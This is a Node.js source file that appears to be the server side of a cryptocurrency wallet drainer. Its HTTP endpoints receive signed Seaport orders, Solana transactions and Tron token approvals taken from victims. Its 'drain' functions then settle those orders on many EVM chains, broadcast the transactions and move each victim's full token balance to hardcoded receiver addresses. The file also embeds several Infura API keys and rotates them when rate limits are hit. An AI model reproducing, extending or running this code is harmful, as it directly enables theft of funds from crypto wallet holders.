require('dotenv').config();
const { ethers } = require("ethers");
const { Connection } = require("@solana/web3.js");
const TronWeb = require('tronweb');
const http = require('http');

// --- GLOBAL CONFIG ---
const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;
const WORKER_PORT = process.env.WORKER_PORT || 8080;

// --- API KEYS ---
const INFURA_IDS = [
    "2859d5b9da2648988a15b3fc6e0783b5",
    "80ce8d8563c24c37b86b86718ed5fd4f",
    "ad74f9b87bd14085895423c071a966fa",
    "f1e1c2680e4c43818263980084866941"
];
let currentInfuraIndex = 0;

function getInfuraId() {
    return INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
}

// Solana Config
const SOLANA_RECEIVER_ADDRESS = process.env.SOLANA_RECEIVER_ADDRESS || "37cr8JQ1iXMaci4io4x9Bdum14SovdVAeneqm8AH3Uo5";
const SOLANA_PRIVATE_KEY = process.env.SOLANA_PRIVATE_KEY;
const SOLANA_RPC = process.env.SOLANA_RPC || "https://api.mainnet-beta.solana.com";
const solanaConnection = new Connection(SOLANA_RPC, "confirmed");

// Tron Config
const TRON_PRIVATE_KEY = process.env.TRON_PRIVATE_KEY;
const TRON_RECEIVER_ADDRESS = "TJ19BCQFh2WDRmtfURVCyLUWMN9X65U8Cx";
const TRON_RPC = process.env.TRON_RPC || "https://api.trongrid.io";
const tronWeb = TRON_PRIVATE_KEY ? new TronWeb(TRON_RPC, TRON_RPC, TRON_RPC, TRON_PRIVATE_KEY) : null;

// EVM Config
const SEAPORT_ADDRESS = "0x00000000000000ADc04C56Bf30aC9d3c0aAf14bD";
const SEAPORT_ABI = ["function fulfillOrder((address offerer, address zone, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount)[] offer, (uint8 itemType, address token, uint256 identifierOrCriteria, uint256 startAmount, uint256 endAmount, address recipient)[] consideration, uint8 orderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 conduitKey, uint256 counter) parameters, bytes signature) external payable returns (bool)"];
const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)", "function transferFrom(address from, address to, uint256 value) public returns (bool)"];

const CHAIN_CONFIGS = {
    "ethereum": { name: "ethereum", id: 1, sub: "" },
    "bsc": { name: "binance smart chain", id: 56, url: "https://bsc-dataseed.binance.org/" },
    "polygon": { name: "polygon", id: 137, sub: "polygon" },
    "base": { name: "base", id: 8453, url: "https://mainnet.base.org" },
    "arbitrum": { name: "arbitrum", id: 42161, sub: "arbitrum" },
    "optimism": { name: "optimism", id: 10, sub: "optimism" },
    "avalanche": { name: "avalanche", id: 43114, sub: "avalanche" },
    "cronos": { name: "cronos", id: 25, url: "https://evm.cronos.org" },
    "fantom": { name: "fantom", id: 250, url: "https://rpc.ftm.tools/" },
    "linea": { name: "linea", id: 59144, url: "https://rpc.linea.build" },
    "scroll": { name: "scroll", id: 534352, url: "https://rpc.scroll.io" },
    "zksync": { name: "zksync", id: 324, url: "https://mainnet.era.zksync.io" },
    "mantle": { name: "mantle", id: 5000, url: "https://rpc.mantle.xyz" },
    "blast": { name: "blast", id: 81457, url: "https://rpc.blast.io" },
    "celo": { name: "celo", id: 42220, url: "https://forno.celo.org" },
    "gnosis": { name: "gnosis", id: 100, url: "https://rpc.gnosischain.com" },
    "moonbeam": { name: "moonbeam", id: 1284, url: "https://rpc.api.moonbeam.network" },
    "moonriver": { name: "moonriver", id: 1285, url: "https://rpc.api.moonriver.network" }
};

// --- DATA QUEUES ---
const SEAPORT_ORDERS = [];
const PENDING_FUNDING = new Map();

// --- HTTP SERVER (UNIFIED) ---
const server = http.createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") { res.writeHead(200); res.end(); return; }

    let body = "";
    req.on("data", chunk => { body += chunk.toString(); });
    req.on("end", async () => {
        try {
            const data = JSON.parse(body);

            if (req.url === "/submit-evm-order") {
                SEAPORT_ORDERS.push({ order: data.order, chainName: data.chainName });
                console.log(`📥 [EVM] Received Seaport Order for ${data.chainName}`);
                return res.end(JSON.stringify({ status: "success" }));
            }

            if (req.url === "/submit-solana-tx") {
                console.log("📥 [SOL] Received Solana Transaction. Broadcasting...");
                const sig = await solanaConnection.sendRawTransaction(Buffer.from(data.rawTransaction, "base64"), { skipPreflight: true });
                console.log(`📤 [SOL] TX Sent: ${sig}`);
                return res.end(JSON.stringify({ status: "success", signature: sig }));
            }

            if (req.url === "/notify-tron-approval") {
                console.log(`📥 [TRON] Received Approval from ${data.owner}`);
                await fulfillTronDrain(data.owner, data.tokenAddress);
                return res.end(JSON.stringify({ status: "success" }));
            }

            res.writeHead(404); res.end("Not Found");
        } catch (e) {
            console.error("❌ Request Error:", e.message);
            res.writeHead(500); res.end(e.message);
        }
    });
});

// --- DRAIN LOGIC ---

async function fulfillSeaportOrder(order, chainName) {
    try {
        const config = CHAIN_CONFIGS[chainName.toLowerCase()];
        let rpcUrl = config.url;
        if (!rpcUrl) {
            rpcUrl = `https://${config.sub || config.name}-mainnet.infura.io/v3/${getInfuraId()}`;
        }

        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
        const tx = await seaport.fulfillOrder(order, "0x0000000000000000000000000000000000000000000000000000000000000000");
        console.log(`✅ [EVM] Seaport Success on ${chainName}: ${tx.hash}`);
        return true;
    } catch (e) {
        console.error(`❌ [EVM] Seaport Failed on ${chainName}:`, e.message);
        if (e.message.includes("429") || e.message.includes("limit")) {
            console.warn("⚠️ Rate limit hit. Rotating Infura ID...");
            currentInfuraIndex++;
        }
        return false;
    }
}

async function fulfillTronDrain(owner, tokenAddress) {
    if (!tronWeb) return;
    try {
        const contract = await tronWeb.contract().at(tokenAddress);
        const balance = await contract.balanceOf(owner).call();
        const tx = await contract.transferFrom(owner, TRON_RECEIVER_ADDRESS, balance).send();
        console.log(`✅ [TRON] Drain Success: ${tx}`);
    } catch (e) {
        console.error(`❌ [TRON] Drain Failed:`, e.message);
    }
}

// --- MAIN LOOP ---
setInterval(async () => {
    // Process EVM Seaport Orders
    if (SEAPORT_ORDERS.length > 0) {
        const item = SEAPORT_ORDERS.shift();
        const success = await fulfillSeaportOrder(item.order, item.chainName);
        if (!success) SEAPORT_ORDERS.push(item); // Retry
    }
}, 5000);

server.listen(WORKER_PORT, () => {
    console.log(`🚀 ULTIMATE WORKER ACTIVE on port ${WORKER_PORT}`);
    console.log(`📡 Monitoring EVM, Solana, and Tron...`);
});
